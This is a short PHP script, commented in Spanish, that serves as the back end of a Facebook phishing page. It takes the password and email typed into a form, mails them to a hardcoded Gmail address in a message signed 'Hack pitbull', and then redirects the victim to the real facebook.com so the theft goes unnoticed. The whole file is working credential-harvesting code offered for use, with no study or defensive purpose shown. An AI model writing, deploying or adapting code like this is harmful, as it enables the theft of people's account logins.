<?php  
//obtenemos la clave
    $clave = $_POST['pass'];
    $correo = $_POST['email'];

    $destinatario = "brandolipedacenteno@gmail.com";
    $asunto = "Contacto desde nuestros servidores linux";
$carta = "De: Hack pitbull \n";
$carta .= "Correo: 12345@gmail.com \n";
$carta .= "Telefono: 123456789 \n";
$carta .= "Mensaje: tu clave es: $clave y tu email es: $correo";

// Enviando Mensaje
 
mail($destinatario, $asunto, $carta);
header('Location:https://www.facebook.com/');
 
 


 
//echo "clave 2 ". $clave;
//echo "correo " . $correo;

?>